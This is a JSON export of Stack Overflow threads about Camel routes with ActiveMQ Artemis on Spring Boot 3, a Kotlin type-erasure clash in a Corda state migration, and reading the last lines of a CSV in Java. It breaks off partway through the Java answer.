{"items":[{"tags":["java","spring-boot","apache-camel","message-queue","activemq-artemis"],"comments":[{"owner":{"account_id":11434008,"reputation":30690,"user_id":8381946,"display_name":"Justin Bertram"},"score":0,"creation_date":1683721009,"post_id":76215514,"comment_id":134409505,"body_markdown":"What exactly isn&#39;t working? Are there any error or warn messages?","body":"What exactly isn&#39;t working? Are there any error or warn messages?"},{"owner":{"account_id":11434008,"reputation":30690,"user_id":8381946,"display_name":"Justin Bertram"},"score":0,"creation_date":1683722769,"post_id":76215514,"comment_id":134409983,"body_markdown":"For what it&#39;s worth, the [Camel 3 documentation](https://camel.apache.org/components/3.20.x/activemq-component.html) states, &quot;The ActiveMQ component is an extension to the JMS component and has been pre-configured for using Apache ActiveMQ 5.x (not Artemis). Users of Apache ActiveMQ Artemis should use the JMS component.&quot;","body":"For what it&#39;s worth, the <a href=\"https://camel.apache.org/components/3.20.x/activemq-component.html\" rel=\"nofollow noreferrer\">Camel 3 documentation</a> states, &quot;The ActiveMQ component is an extension to the JMS component and has been pre-configured for using Apache ActiveMQ 5.x (not Artemis). Users of Apache ActiveMQ Artemis should use the JMS component.&quot;"},{"owner":{"account_id":4435906,"reputation":35,"user_id":3611772,"display_name":"user3611772"},"score":0,"creation_date":1683764695,"post_id":76215514,"comment_id":134418208,"body_markdown":"I referred to documentation but it didn&#39;t help. Queues are not getting created in artemis @JustinBertram","body":"I referred to documentation but it didn&#39;t help. Queues are not getting created in artemis @JustinBertram"},{"owner":{"account_id":11434008,"reputation":30690,"user_id":8381946,"display_name":"Justin Bertram"},"score":0,"creation_date":1683772306,"post_id":76215514,"comment_id":134418890,"body_markdown":"How do you know the queues are not getting created in ActiveMQ Artemis? Are there any error or warn messages? Please elaborate. You aren&#39;t providing enough information to help diagnose the issue.","body":"How do you know the queues are not getting created in ActiveMQ Artemis? Are there any error or warn messages? Please elaborate. You aren&#39;t providing enough information to help diagnose the issue."},{"owner":{"account_id":4435906,"reputation":35,"user_id":3611772,"display_name":"user3611772"},"score":0,"creation_date":1683782121,"post_id":76215514,"comment_id":134419841,"body_markdown":"No errors. I am not able to see the queue in artemis console where as in old application - springboot 2 with artemis queues are getting created.","body":"No errors. I am not able to see the queue in artemis console where as in old application - springboot 2 with artemis queues are getting created."},{"owner":{"account_id":6463892,"reputation":15974,"user_id":5277820,"accept_rate":68,"display_name":"dur"},"score":1,"creation_date":1694715983,"post_id":76215514,"comment_id":135931502,"body_markdown":"Does this answer your question? [Apache Camel support for Spring Boot 3](https://stackoverflow.com/questions/74701345/apache-camel-support-for-spring-boot-3)","body":"Does this answer your question? <a href=\"https://stackoverflow.com/questions/74701345/apache-camel-support-for-spring-boot-3\">Apache Camel support for Spring Boot 3</a>"}],"answers":[{"tags":[],"owner":{"account_id":176018,"reputation":56316,"user_id":406429,"display_name":"Claus Ibsen"},"down_vote_count":1,"up_vote_count":0,"is_accepted":false,"score":-1,"last_activity_date":1683702689,"creation_date":1683702689,"answer_id":76215788,"question_id":76215514,"body_markdown":"You need Apache Camel v4 to work with Spring Boot 3.\r\nCamel v3 is only compatible with Spring Boot 2.\r\n\r\n","title":"ActiveMQ Artemis + Spring Boot 3 + Apache Camel - RouteBuilder is not working","body":"<p>You need Apache Camel v4 to work with Spring Boot 3.\nCamel v3 is only compatible with Spring Boot 2.</p>\n"}],"owner":{"account_id":4435906,"reputation":35,"user_id":3611772,"display_name":"user3611772"},"comment_count":6,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":711,"favorite_count":0,"down_vote_count":2,"up_vote_count":0,"answer_count":1,"score":-2,"last_activity_date":1683728724,"creation_date":1683700600,"question_id":76215514,"body_markdown":"I created a very simple Spring Boot 3.0 project with Apache Camel and ActiveMQ Artemis since ActiveMQ &quot;Classic&quot; support has been discontinued in Spring Boot 3. My MQ routes are not working. Any help here is really appreciated.\r\n\r\n`pom.xml` dependencies:\r\n```xml\r\n&lt;parent&gt;\r\n    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;\r\n    &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;\r\n    &lt;version&gt;3.0.5&lt;/version&gt;\r\n    &lt;relativePath/&gt; &lt;!-- lookup parent from repository --&gt;\r\n&lt;/parent&gt;\r\n&lt;dependency&gt;\r\n    &lt;groupId&gt;org.apache.activemq&lt;/groupId&gt;\r\n    &lt;artifactId&gt;artemis-jms-client&lt;/artifactId&gt;\r\n    &lt;version&gt;2.28.0&lt;/version&gt;\r\n&lt;/dependency&gt;\r\n&lt;dependency&gt;\r\n    &lt;groupId&gt;org.apache.camel.springboot&lt;/groupId&gt;\r\n    &lt;artifactId&gt;camel-jms-starter&lt;/artifactId&gt;\r\n    &lt;version&gt;3.20.2&lt;/version&gt;\r\n&lt;/dependency&gt;\r\n&lt;dependency&gt;\r\n    &lt;groupId&gt;org.apache.camel.springboot&lt;/groupId&gt;\r\n    &lt;artifactId&gt;camel-spring-boot-starter&lt;/artifactId&gt;\r\n    &lt;version&gt;3.20.2&lt;/version&gt;\r\n&lt;/dependency&gt;\r\n&lt;dependency&gt;\r\n    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;\r\n    &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;\r\n&lt;/dependency&gt;\r\n&lt;dependency&gt;\r\n    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;\r\n    &lt;artifactId&gt;spring-boot-starter-artemis&lt;/artifactId&gt;\r\n&lt;/dependency&gt;\r\n&lt;dependency&gt;\r\n    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;\r\n    &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;\r\n&lt;/dependency&gt;\r\n```\r\n```java\r\n@SpringBootApplication\r\npublic class ArtemisApplication {\r\n    public static void main(String[] args) {\r\n        SpringApplication.run(ArtemisApplication.class, args);\r\n    }\r\n}\r\n```\r\n`application.properties`:\r\n```\r\nspring.artemis.broker-url=tcp://localhost:61616\r\ncamel.springboot.auto-startup=true\r\nspring.artemis.password=admin\r\nspring.artemis.user=admin\r\nspring.artemis.mode=native\r\ncamel.servlet.mapping.context-path=/services/*\r\n```\r\nRouteBuilder class:\r\n```java\r\n@Component\r\n@Slf4j\r\npublic class ArtemisMQRouter extends RouteBuilder {\r\n    @Override\r\n    public void configure() throws Exception {\r\n        from(&quot;activemq:queue:input&quot;)\r\n                .routeId(&quot;ArtemisMQRouter &quot;)\r\n                .id(&quot;activemq:queue:input&quot;)\r\n                .log(LoggingLevel.INFO, log, &quot;Message received from activemq:queue:input&quot;)\r\n                .to(&quot;activemq:queue:output&quot;)                \r\n                .log(LoggingLevel.INFO, log, &quot;Message successfully sent to the activemq:queue:output&quot;)\r\n                .end();\r\n    }\r\n}\r\n```","title":"ActiveMQ Artemis + Spring Boot 3 + Apache Camel - RouteBuilder is not working","body":"<p>I created a very simple Spring Boot 3.0 project with Apache Camel and ActiveMQ Artemis since ActiveMQ &quot;Classic&quot; support has been discontinued in Spring Boot 3. My MQ routes are not working. Any help here is really appreciated.</p>\n<p><code>pom.xml</code> dependencies:</p>\n<pre class=\"lang-xml prettyprint-override\"><code>&lt;parent&gt;\n    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;\n    &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;\n    &lt;version&gt;3.0.5&lt;/version&gt;\n    &lt;relativePath/&gt; &lt;!-- lookup parent from repository --&gt;\n&lt;/parent&gt;\n&lt;dependency&gt;\n    &lt;groupId&gt;org.apache.activemq&lt;/groupId&gt;\n    &lt;artifactId&gt;artemis-jms-client&lt;/artifactId&gt;\n    &lt;version&gt;2.28.0&lt;/version&gt;\n&lt;/dependency&gt;\n&lt;dependency&gt;\n    &lt;groupId&gt;org.apache.camel.springboot&lt;/groupId&gt;\n    &lt;artifactId&gt;camel-jms-starter&lt;/artifactId&gt;\n    &lt;version&gt;3.20.2&lt;/version&gt;\n&lt;/dependency&gt;\n&lt;dependency&gt;\n    &lt;groupId&gt;org.apache.camel.springboot&lt;/groupId&gt;\n    &lt;artifactId&gt;camel-spring-boot-starter&lt;/artifactId&gt;\n    &lt;version&gt;3.20.2&lt;/version&gt;\n&lt;/dependency&gt;\n&lt;dependency&gt;\n    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;\n    &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;\n&lt;/dependency&gt;\n&lt;dependency&gt;\n    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;\n    &lt;artifactId&gt;spring-boot-starter-artemis&lt;/artifactId&gt;\n&lt;/dependency&gt;\n&lt;dependency&gt;\n    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;\n    &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;\n&lt;/dependency&gt;\n</code></pre>\n<pre class=\"lang-java prettyprint-override\"><code>@SpringBootApplication\npublic class ArtemisApplication {\n    public static void main(String[] args) {\n        SpringApplication.run(ArtemisApplication.class, args);\n    }\n}\n</code></pre>\n<p><code>application.properties</code>:</p>\n<pre><code>spring.artemis.broker-url=tcp://localhost:61616\ncamel.springboot.auto-startup=true\nspring.artemis.password=admin\nspring.artemis.user=admin\nspring.artemis.mode=native\ncamel.servlet.mapping.context-path=/services/*\n</code></pre>\n<p>RouteBuilder class:</p>\n<pre class=\"lang-java prettyprint-override\"><code>@Component\n@Slf4j\npublic class ArtemisMQRouter extends RouteBuilder {\n    @Override\n    public void configure() throws Exception {\n        from(&quot;activemq:queue:input&quot;)\n                .routeId(&quot;ArtemisMQRouter &quot;)\n                .id(&quot;activemq:queue:input&quot;)\n                .log(LoggingLevel.INFO, log, &quot;Message received from activemq:queue:input&quot;)\n                .to(&quot;activemq:queue:output&quot;)                \n                .log(LoggingLevel.INFO, log, &quot;Message successfully sent to the activemq:queue:output&quot;)\n                .end();\n    }\n}\n</code></pre>\n"},{"tags":["java","kotlin","migration","corda"],"answers":[{"tags":[],"owner":{"account_id":13884104,"reputation":1032,"user_id":10023710,"display_name":"Peter Li"},"down_vote_count":0,"up_vote_count":1,"is_accepted":false,"score":1,"last_activity_date":1682475969,"creation_date":1682475969,"answer_id":76106730,"question_id":76063627,"body_markdown":"The problem probably begin with remove the drivers field. Technically, you should not delete a field in a contract state. You won&#39;t be able to load any existing states on the ledger after you delete a field from a old version state. \r\n\r\nYou need to add new field as nullable and preserve old fields. Once all nodes on the network have upgraded, you can stop populating the old field, but you should never stop having and understanding the old field, because anything old loaded from the ledger will populate it and complain if it isn&#39;t there. \r\n\r\nAs for the constructor cannot tell the difference between Set&lt;A&gt; and Set&lt;B&gt;, you are on the right path of fixing it. \r\n\r\n","title":"Kotlin type erasure error in corda state migration","body":"<p>The problem probably begin with remove the drivers field. Technically, you should not delete a field in a contract state. You won't be able to load any existing states on the ledger after you delete a field from a old version state.</p>\n<p>You need to add new field as nullable and preserve old fields. Once all nodes on the network have upgraded, you can stop populating the old field, but you should never stop having and understanding the old field, because anything old loaded from the ledger will populate it and complain if it isn't there.</p>\n<p>As for the constructor cannot tell the difference between Set and Set, you are on the right path of fixing it.</p>\n"},{"tags":[],"owner":{"account_id":3438358,"reputation":127,"user_id":2880893,"display_name":"Amol Pednekar"},"down_vote_count":0,"up_vote_count":1,"is_accepted":false,"score":1,"last_activity_date":1683728536,"creation_date":1683728536,"answer_id":76219569,"question_id":76063627,"body_markdown":"Assuming this is your state\r\n\r\n    data class ExampleState(\r\n            val custom: Set&lt;CustomDriverClass&gt;\r\n            override val participants: List&lt;AbstractParty&gt; = listOf()\r\n    ) : ContractState\r\n\r\nChange to\r\n\r\n    data class ExampleState(\r\n            val custom: Set&lt;String&gt;\r\n            override val participants: List&lt;AbstractParty&gt; = listOf()\r\n    ) : ContractState {\r\n        @DeprecatedConstructorForDeserialization(1)\r\n        constructor(\r\n            val custom: Set&lt;CustomDriverClass&gt;,\r\n            participants: List&lt;Party&gt;): this(emptySet&lt;String&gt;(), participants)\r\n    }\r\n    \r\n\r\nInstead of `emptySet()` on the last line, you can convert from `Set&lt;CustomDriverClass&gt;` to `Set&lt;String&gt;` if possible so that the deserialization of old states to the new set contains the old data, or if not possible, just ignore it and init the set as `emptySet&lt;String&gt;`","title":"Kotlin type erasure error in corda state migration","body":"<p>Assuming this is your state</p>\n<pre><code>data class ExampleState(\n        val custom: Set&lt;CustomDriverClass&gt;\n        override val participants: List&lt;AbstractParty&gt; = listOf()\n) : ContractState\n</code></pre>\n<p>Change to</p>\n<pre><code>data class ExampleState(\n        val custom: Set&lt;String&gt;\n        override val participants: List&lt;AbstractParty&gt; = listOf()\n) : ContractState {\n    @DeprecatedConstructorForDeserialization(1)\n    constructor(\n        val custom: Set&lt;CustomDriverClass&gt;,\n        participants: List&lt;Party&gt;): this(emptySet&lt;String&gt;(), participants)\n}\n</code></pre>\n<p>Instead of <code>emptySet()</code> on the last line, you can convert from <code>Set&lt;CustomDriverClass&gt;</code> to <code>Set&lt;String&gt;</code> if possible so that the deserialization of old states to the new set contains the old data, or if not possible, just ignore it and init the set as <code>emptySet&lt;String&gt;</code></p>\n"}],"owner":{"account_id":17248886,"reputation":105,"user_id":12489459,"display_name":"Benjamin"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":122,"favorite_count":0,"down_vote_count":1,"up_vote_count":0,"answer_count":2,"score":-1,"last_activity_date":1683728536,"creation_date":1681990677,"question_id":76063627,"body_markdown":"I have a Corda State **CarA** having field **drivers**: Set&lt;**CustomDriverClass**&gt;. But in next version, I want to change the datatype of Set&lt;**CustomDriverClass**&gt; with Set&lt;**String**&gt;. But corda doesn&#39;t allow to change it directly \r\n(Reference: https://corda.net/blog/a-developers-primer-on-cordapp-upgrades/). \r\n\r\nSo, I added a new field name =&gt; **driversV2**: Set&lt;**String**&gt; &amp; removed the **drivers** field. Then added a depreciatedDeserialisationConstructor(1) for this new field added.\r\n\r\nNow problem is, \r\n&quot;**Platform declaration clash: The following declarations have the same JVM signature**&quot; occured.\r\n\r\n**Reason for the Issue**: It’s because the JVM signature of depreciation constructor and main state class are taking as same. The only difference between them is the datatype difference inside Set.\r\n\r\n    Set&lt;CustomDriverClass&gt; &amp; Set&lt;String&gt;\r\n\r\n which is not considered due to Type Erasure in Kotlin.\r\n\r\n**Quick fix**: I found a fix by simply changing the position of driversV2 in main class &amp; hereby changed the JVM signature there.\r\n\r\nBut please let me know how to properly handle this.\r\n","title":"Kotlin type erasure error in corda state migration","body":"<p>I have a Corda State <strong>CarA</strong> having field <strong>drivers</strong>: Set&lt;<strong>CustomDriverClass</strong>&gt;. But in next version, I want to change the datatype of Set&lt;<strong>CustomDriverClass</strong>&gt; with Set&lt;<strong>String</strong>&gt;. But corda doesn't allow to change it directly\n(Reference: <a href=\"https://corda.net/blog/a-developers-primer-on-cordapp-upgrades/\" rel=\"nofollow noreferrer\">https://corda.net/blog/a-developers-primer-on-cordapp-upgrades/</a>).</p>\n<p>So, I added a new field name =&gt; <strong>driversV2</strong>: Set&lt;<strong>String</strong>&gt; &amp; removed the <strong>drivers</strong> field. Then added a depreciatedDeserialisationConstructor(1) for this new field added.</p>\n<p>Now problem is,\n&quot;<strong>Platform declaration clash: The following declarations have the same JVM signature</strong>&quot; occured.</p>\n<p><strong>Reason for the Issue</strong>: It’s because the JVM signature of depreciation constructor and main state class are taking as same. The only difference between them is the datatype difference inside Set.</p>\n<pre><code>Set&lt;CustomDriverClass&gt; &amp; Set&lt;String&gt;\n</code></pre>\n<p>which is not considered due to Type Erasure in Kotlin.</p>\n<p><strong>Quick fix</strong>: I found a fix by simply changing the position of driversV2 in main class &amp; hereby changed the JVM signature there.</p>\n<p>But please let me know how to properly handle this.</p>\n"},{"tags":["java","bufferedreader"],"comments":[{"owner":{"account_id":71739,"reputation":307142,"user_id":207421,"accept_rate":82,"display_name":"user207421"},"score":2,"creation_date":1682842070,"post_id":76140064,"comment_id":134276400,"body_markdown":"You can&#39;t. It is up to you to ignore lines you don&#39;t want to process.","body":"You can&#39;t. It is up to you to ignore lines you don&#39;t want to process."},{"owner":{"account_id":4829520,"reputation":64,"user_id":3898032,"display_name":"dave110022"},"score":0,"creation_date":1682846502,"post_id":76140064,"comment_id":134276810,"body_markdown":"You could read the end of the file using a random access file and reading approximately the last 55 lines.  Then you split it by carriage return and work backwards line by line reading the last 55 lines.  No need for BufferedFileReader","body":"You could read the end of the file using a random access file and reading approximately the last 55 lines.  Then you split it by carriage return and work backwards line by line reading the last 55 lines.  No need for BufferedFileReader"},{"owner":{"account_id":15718721,"reputation":988,"user_id":11342225,"display_name":"alea"},"score":3,"creation_date":1682857052,"post_id":76140064,"comment_id":134277956,"body_markdown":"Does this help you [How to read last 5 lines of a .txt file into java](https://stackoverflow.com/questions/9465269/how-to-read-last-5-lines-of-a-txt-file-into-java)","body":"Does this help you <a href=\"https://stackoverflow.com/questions/9465269/how-to-read-last-5-lines-of-a-txt-file-into-java\">How to read last 5 lines of a .txt file into java</a>"},{"owner":{"account_id":7612423,"reputation":82486,"user_id":5772882,"display_name":"Anonymous"},"score":0,"creation_date":1682866407,"post_id":76140064,"comment_id":134279129,"body_markdown":"Use a text editor to save the last 25 lines into a separate file for your Java program to read. Or following the suggestion by @user207421 read every line, parse the date into a `LocalDate`, and if it is not in the relevant range, ignore  the line.","body":"Use a text editor to save the last 25 lines into a separate file for your Java program to read. Or following the suggestion by @user207421 read every line, parse the date into a <code>LocalDate</code>, and if it is not in the relevant range, ignore  the line."},{"owner":{"account_id":7612423,"reputation":82486,"user_id":5772882,"display_name":"Anonymous"},"score":0,"creation_date":1682874116,"post_id":76140064,"comment_id":134280181,"body_markdown":"I don’t know what you may need time zone for. It’s more correct to use `ZoneId` to represent it (not `String`). Also be aware that some US states span more than one time zone.","body":"I don’t know what you may need time zone for. It’s more correct to use <code>ZoneId</code> to represent it (not <code>String</code>). Also be aware that some US states span more than one time zone."}],"answers":[{"tags":[],"owner":{"account_id":25889789,"reputation":36,"user_id":19617377,"display_name":"Owner - DSF"},"down_vote_count":1,"up_vote_count":1,"is_accepted":false,"score":0,"last_activity_date":1683728478,"creation_date":1682900811,"answer_id":76144172,"question_id":76140064,"body_markdown":"**Method 1: Read all lines into an ArrayList and extract the last certain lines.** \r\n=\r\n\r\n    public class ReadCertainLastLines {\r\n        ReadCertainLastLines() {\r\n            ArrayList&lt;String&gt; readLines = new ArrayList&lt;&gt;();\r\n    \r\n            String path = &quot;path to csv file&quot;;\r\n            int noOfLinesToReadFromEnd = 10;\r\n\r\n            readAll(path, readLines);\r\n    \r\n            String[] last_10 = extractLines(readLines, noOfLinesToReadFromEnd);\r\n            System.out.println(Arrays.toString(last_10));\r\n        }\r\n    \r\n        public static void main(String[] args) {\r\n            new ReadCertainLastLines();\r\n        }\r\n    \r\n        public void readAll(String path, ArrayList&lt;String&gt; toWhichArray) {\r\n            try {\r\n                String line;\r\n                BufferedReader br = new BufferedReader(new FileReader(path));\r\n    \r\n                while ((line = br.readLine()) != null) {\r\n                    String[] values = line.split(&quot;,&quot;);\r\n                    toWhichArray.add(Arrays.toString(values));\r\n                }\r\n    \r\n                br.close();\r\n            } catch (IOException e) {\r\n                e.printStackTrace();\r\n            }\r\n        }\r\n    \r\n        public String[] extractLines(ArrayList&lt;String&gt; originalArray, int noOfLines) {\r\n    \r\n            String[] cutOffList = new String[noOfLines];\r\n    \r\n            for (int loop = 0; loop &lt;= noOfLines - 1; loop++) {\r\n                cutOffList[loop] = originalArray.get(originalArray.size() - noOfLines + loop);\r\n            }\r\n    \r\n            return cutOffList;\r\n        }\r\n    }\r\n\r\nNote that the above code will read all lines with splitting.\r\n\r\nAnother example of using this code **without splitting every line** is:\r\n\r\n    public class ReadCertainLines2 {\r\n        ReadCertainLines2() {\r\n    \r\n            String csvFile = &quot;your_file.csv&quot;;\r\n            int linesToKeep = 10;\r\n    \r\n            String[] last_10 = ReadCertainLines(csvFile, linesToKeep);\r\n            System.out.println(Arrays.toString(last_10));\r\n        }\r\n    \r\n        public static void main(String[] args) {\r\n            new ReadCertainLines2();\r\n        }\r\n    \r\n    \r\n        public String[] ReadCertainLines(String csvFile, int linesToKeep) {\r\n            ArrayList&lt;String&gt; lines = new ArrayList&lt;&gt;();\r\n            ArrayList&lt;String&gt; extractedLines = new ArrayList&lt;&gt;();\r\n    \r\n            try (BufferedReader br = new BufferedReader(new FileReader(csvFile))) {\r\n    \r\n                String line;\r\n    \r\n                // Read all lines from the CSV file\r\n                while ((line = br.readLine()) != null) {\r\n                    lines.add(line);\r\n                }\r\n    \r\n                // Keep only the last 10 lines\r\n                int startIndex = lines.size() &gt; linesToKeep ? lines.size() - linesToKeep : 0;\r\n    \r\n                for (int i = startIndex; i &lt; lines.size(); i++) {\r\n                    extractedLines.add(lines.get(i));\r\n                }\r\n    \r\n            } catch (IOException e) {\r\n                e.printStackTrace();\r\n            }\r\n    \r\n            return extractedLines.toArray(new String[0]);\r\n        }\r\n    }\r\n\r\nIn this sample codes, I&#39;m reading all lines into an pre-initialized ArrayList of string and extracting the last certain lines to a String list (`String[]`). You can use this as a tool class of your program. In this case this reads all lines and stores. So it will use a lot of computer memory as your csv has  60 000 lines. \r\n\r\n`noOfLinesToReadFromEnd` is the number of lines you need to read from the end of the csv. In your case it&#39;s 55. \r\n\r\nMethod 2: Use Apache Commons IO `ReversedLinesFileReader` and read first 55 lines.\r\n=\r\n\r\nYou can use Apache Commons IO ReversedLinesFileReader to this. Then read it like you&#39;re reading first 55 lines of the CSV. But in this case you&#39;ll get last line first and ... Of course you can use Reserve the lines again and read it. \r\n\r\n    public class ReadCertainLinesCommons {\r\n    \r\n        ReadCertainLinesCommons() {\r\n    \r\n            String csvFile = &quot;path to csv file&quot;;\r\n            int noOfLinesToReadFromEnd = 10;\r\n    \r\n                    String[] last_10 = extractLines(readLines, noOfLinesToReadFromEnd);\r\n        System.out.println(Arrays.toString(last_10));\r\n\r\n        }\r\n    \r\n        public static void main(String[] args) {\r\n            new ReadCertainLinesCommons();\r\n        }\r\n    \r\n        public String[] ReadLastCertainLinesWithCommons(String csvFile, int lastLinesToKeep) {\r\n    \r\n            ArrayList&lt;String&gt; toWhichArray = new ArrayList&lt;&gt;(lastLinesToKeep);\r\n    \r\n            try (ReversedLinesFileReader reader = new ReversedLinesFileReader(new File(csvFile), Charset.defaultCharset())) {\r\n    \r\n                // Read the last 10 lines\r\n                String line;\r\n                int lineCount = 0;\r\n    \r\n                while ((line = reader.readLine()) != null &amp;&amp; lineCount &lt;= lastLinesToKeep - 1) {\r\n    \r\n                    String[] values = line.split(&quot;,&quot;);\r\n                    toWhichArray.add(Arrays.toString(values));\r\n    \r\n                    lineCount++;\r\n                }\r\n    \r\n            } catch (IOException e) {\r\n                e.printStackTrace();\r\n            }\r\n    \r\n            return toWhichArray.toArray(new String[0]);\r\n        }\r\n    }\r\n\r\nThis code uses the `ReversedLinesFileReader` class to read the CSV file in reverse order, starting from the end of the file. It then reads the last 10 lines of the file and adds them to a ArrayList object. It converts it to a String List. Finally, it prints out the last 10 lines. Note that the lines are added to the String List in reverse order, so they need to be reversed again before printing them out. I did it too. (Look at the code)\r\n\r\nI&#39;ve another example of using `ReversedLinesFileReader`. It doesn&#39;t process a split at all. So it&#39;s more quicker.\r\n\r\n    public class ReadLast10LinesCSV {\r\n     \r\n        public static void main(String[] args) {\r\n     \r\n            String csvFile = &quot;your_file.csv&quot;;\r\n            List&lt;String&gt; lines = new ArrayList&lt;&gt;();\r\n            int linesToKeep = 10;\r\n     \r\n            try (BufferedReader br = new BufferedReader(new FileReader(csvFile))) {\r\n     \r\n                String line;\r\n     \r\n                // Read all lines from the CSV file\r\n                while ((line = br.readLine()) != null) {\r\n                    lines.add(line);\r\n                }\r\n     \r\n                // Keep only the last 10 lines\r\n                int startIndex = lines.size() &gt; linesToKeep ? lines.size() - linesToKeep : 0;\r\n                for (int i = startIndex; i &lt; lines.size(); i++) {\r\n                    System.out.println(lines.get(i));\r\n                }\r\n     \r\n            } catch (IOException e) {\r\n                e.printStackTrace();\r\n            }\r\n        }\r\n    }\r\n\r\nNote that this method will be much quicker as it doesn&#39;t read all the lines of csv. (Thanks to @StephenC) \r\n\r\nMethod 3: Using `java.io.RandomAccessFile`\r\n=\r\n\r\nThis is the most appropriate and most quickest way. It is the most powerful way when comparing the three methods. \r\n\r\nWhy: It doesn&#39;t read all the lines as first method.\r\n     It doesn&#39;t need to reverse order the lines twice as the second method.\r\n     It doesn&#39;t need splitting lines as method 1 - example 1 and method 2 - example 1.\r\n\r\nSo thanks to @StephenC for giving me the idea.\r\n\r\nPlease note that this&#39;s isn&#39;t a great util class yet. I&#39;ll improve it.\r\n\r\n    public class ReadCertainLines_Best {\r\n        ReadCertainLines_Best() {\r\n            String csvFile = &quot;your csv file here&quot;;\r\n            int linesToKeep = 10;\r\n    \r\n            printThem(ReadCertainLines(csvFile, linesToKeep));\r\n        }\r\n    \r\n        public static void main(String[] args) {\r\n            new ReadCertainLines_Best();\r\n        }\r\n    \r\n        public HashMap&lt;String, Object&gt; ReadCertainLines(String csvFile, int linesToKeep) {\r\n            byte[] buffer = new byte[1024];\r\n            StringBuilder sb = new StringBuilder();\r\n    \r\n            HashMap&lt;String, Object&gt; map = new HashMap&lt;&gt;();\r\n    \r\n            try (RandomAccessFile file = new RandomAccessFile(csvFile, &quot;r&quot;)) {\r\n    \r\n                // Find the last line ending position\r\n                long fileLength = file.length();\r\n                long filePointer = fileLength - 1;\r\n                int lineCount = 0;\r\n    \r\n                while (filePointer &gt;= 0 &amp;&amp; lineCount &lt; linesToKeep) {\r\n                    file.seek(filePointer);\r\n                    byte c = file.readByte();\r\n    \r\n                    if (c == &#39;\\n&#39; || c == &#39;\\r&#39;) {\r\n                        lineCount++;\r\n                    }\r\n    \r\n                    filePointer--;\r\n                }\r\n    \r\n                // Read the last 10 lines\r\n                while (true) {\r\n                    int bytesRead = file.read(buffer);\r\n    \r\n                    if (bytesRead == -1) {\r\n                        break;\r\n                    }\r\n    \r\n                    for (int i = 0; i &lt; bytesRead; i++) {\r\n                        sb.append((char) buffer[i]);\r\n                    }\r\n                }\r\n    \r\n                String[] lines = sb.toString().split(&quot;\\n&quot;);\r\n    \r\n                // Print the last 10 lines\r\n                int startIndex = lines.length &gt; linesToKeep ? lines.length - linesToKeep : 0;\r\n    \r\n                map.put(&quot;startIndex&quot;, startIndex);\r\n                map.put(&quot;length&quot;, lines.length);\r\n                map.put(&quot;lines&quot;, lines);\r\n    \r\n    //            for (int i = startIndex; i &lt; lines.length; i++) {\r\n    //                System.out.println(lines[i]);\r\n    //            }\r\n    \r\n            } catch (IOException e) {\r\n                e.printStackTrace();\r\n            }\r\n    \r\n            return map;\r\n        }\r\n    \r\n        public void printThem(HashMap&lt;String, Object&gt; map) {\r\n            for (int i = (int) map.get(&quot;startIndex&quot;); i &lt; (int) map.get(&quot;length&quot;); i++) {\r\n                System.out.println(((String[]) map.get(&quot;lines&quot;))[i]);\r\n            }\r\n        }\r\n    }\r\n\r\nThis code uses the `RandomAccessFile` class to seek to the end of the file, and then moves backwards through the file, counting the number of line breaks it encounters until it has found the last certain number of lines. It then reads those lines into a StringBuilder object and splits them into an array of individual lines. It creates a HashMap and passes lines, startIndex and the length of the String List. And print with the help of a for loop. This&#39;s neither yet great as a util class nor described well. But It works and it&#39;ll update the answer soon.","title":"How can I get Buffered Reader to read only certain lines of a csv txt file?","body":"<h1><strong>Method 1: Read all lines into an ArrayList and extract the last certain lines.</strong></h1>\n<pre><code>public class ReadCertainLastLines {\n    ReadCertainLastLines() {\n        ArrayList&lt;String&gt; readLines = new ArrayList&lt;&gt;();\n\n        String path = &quot;path to csv file&quot;;\n        int noOfLinesToReadFromEnd = 10;\n\n        readAll(path, readLines);\n\n        String[] last_10 = extractLines(readLines, noOfLinesToReadFromEnd);\n        System.out.println(Arrays.toString(last_10));\n    }\n\n    public static void main(String[] args) {\n        new ReadCertainLastLines();\n    }\n\n    public void readAll(String path, ArrayList&lt;String&gt; toWhichArray) {\n        try {\n            String line;\n            BufferedReader br = new BufferedReader(new FileReader(path));\n\n            while ((line = br.readLine()) != null) {\n                String[] values = line.split(&quot;,&quot;);\n                toWhichArray.add(Arrays.toString(values));\n            }\n\n            br.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public String[] extractLines(ArrayList&lt;String&gt; originalArray, int noOfLines) {\n\n        String[] cutOffList = new String[noOfLines];\n\n        for (int loop = 0; loop &lt;= noOfLines - 1; loop++) {\n            cutOffList[loop] = originalArray.get(originalArray.size() - noOfLines + loop);\n        }\n\n        return cutOffList;\n    }\n}\n</code></pre>\n<p>Note that the above code will read all lines with splitting.</p>\n<p>Another example of using this code <strong>without splitting every line</strong> is:</p>\n<pre><code>public class ReadCertainLines2 {\n    ReadCertainLines2() {\n\n        String csvFile = &quot;your_file.csv&quot;;\n        int linesToKeep = 10;\n\n        String[] last_10 = ReadCertainLines(csvFile, linesToKeep);\n        System.out.println(Arrays.toString(last_10));\n    }\n\n    public static void main(String[] args) {\n        new ReadCertainLines2();\n    }\n\n\n    public String[] ReadCertainLines(String csvFile, int linesToKeep) {\n        ArrayList&lt;String&gt; lines = new ArrayList&lt;&gt;();\n        ArrayList&lt;String&gt; extractedLines = new ArrayList&lt;&gt;();\n\n        try (BufferedReader br = new BufferedReader(new FileReader(csvFile))) {\n\n            String line;\n\n            // Read all lines from the CSV file\n            while ((line = br.readLine()) != null) {\n                lines.add(line);\n            }\n\n            // Keep only the last 10 lines\n            int startIndex = lines.size() &gt; linesToKeep ? lines.size() - linesToKeep : 0;\n\n            for (int i = 